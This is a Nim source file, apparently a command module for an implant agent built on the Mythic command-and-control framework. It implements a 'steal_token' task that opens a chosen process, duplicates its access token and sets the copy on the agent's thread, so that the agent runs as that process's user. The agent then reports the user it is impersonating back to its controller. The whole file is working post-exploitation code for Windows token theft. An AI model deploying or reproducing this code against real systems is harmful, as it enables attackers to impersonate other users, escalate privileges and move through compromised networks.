## Steal Token - Steals a primary token from another process

import std/[json, strformat, strutils]
import ../config
import ../utils/mythic_responses
import token_manager

when defined(windows):
  import winim/lean
  
  proc stealToken*(taskId: string, params: JsonNode): JsonNode =
    ## Steal a token from a target process
    let cfg = getConfig()
    
    try:
      # Parse PID from parameters
      let pidStr = if params.kind == JString:
                    params.getStr()
                  elif params.hasKey("pid"):
                    $params["pid"]
                  else:
                    return mythicError(taskId, "No PID provided")
      
      let pid = try:
        pidStr.strip().parseInt().uint32
      except:
        return mythicError(taskId, &"Invalid PID: {pidStr}")
      
      if cfg.debug:
        echo &"[DEBUG] steal_token: PID={pid}"
      
      # Open the target process
      let processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid.DWORD)
      if processHandle == 0:
        let errorCode = GetLastError()
        return mythicError(taskId, &"Failed to open process {pid}. Error code: {errorCode}")
      
      # Open the process token
      var processToken: HANDLE = 0
      if OpenProcessToken(processHandle, TOKEN_DUPLICATE or TOKEN_QUERY, addr processToken) == 0:
        let errorCode = GetLastError()
        CloseHandle(processHandle)
        return mythicError(taskId, &"Failed to open process token. Error code: {errorCode}")
      
      # Duplicate the token to create an impersonation token
      var impersonationToken: HANDLE = 0
      if DuplicateTokenEx(processToken, MAXIMUM_ALLOWED, nil, SecurityImpersonation, 
                          tokenImpersonation, addr impersonationToken) == 0:
        let errorCode = GetLastError()
        CloseHandle(processToken)
        CloseHandle(processHandle)
        return mythicError(taskId, &"Failed to duplicate token. Error code: {errorCode}")
      
      # Clean up process handles
      CloseHandle(processToken)
      CloseHandle(processHandle)
      
      # Revert to self before setting the thread token
      if RevertToSelf() == 0:
        let errorCode = GetLastError()
        CloseHandle(impersonationToken)
        return mythicError(taskId, &"Failed to revert to self. Error code: {errorCode}")
      
      # Set the thread token (SetThreadToken makes a copy, so we keep our handle)
      if SetThreadToken(nil, impersonationToken) == 0:
        let errorCode = GetLastError()
        CloseHandle(impersonationToken)
        return mythicError(taskId, &"Failed to set thread token. Error code: {errorCode}")
      
      # Store the token handle for later cleanup
      # We keep the handle since SetThreadToken doesn't take ownership
      setTokenHandle(impersonationToken)
      
      # Get the new user context (after impersonation)
      let newUser = getCurrentUsername()
      
      if cfg.debug:
        echo &"[DEBUG] Successfully stole token from PID {pid}: {newUser}"
      
      # Build response with callback data
      return mythicCallback(taskId, &"Successfully impersonated {newUser} from PID {pid}", %*{
        "impersonation_context": newUser
      })
      
    except:
      let e = getCurrentException()
      return mythicError(taskId, &"steal_token error: {e.msg}")

else:
  # Unix placeholder
  proc stealToken*(taskId: string, params: JsonNode): JsonNode =
    return mythicError(taskId, "steal_token is only available on Windows")
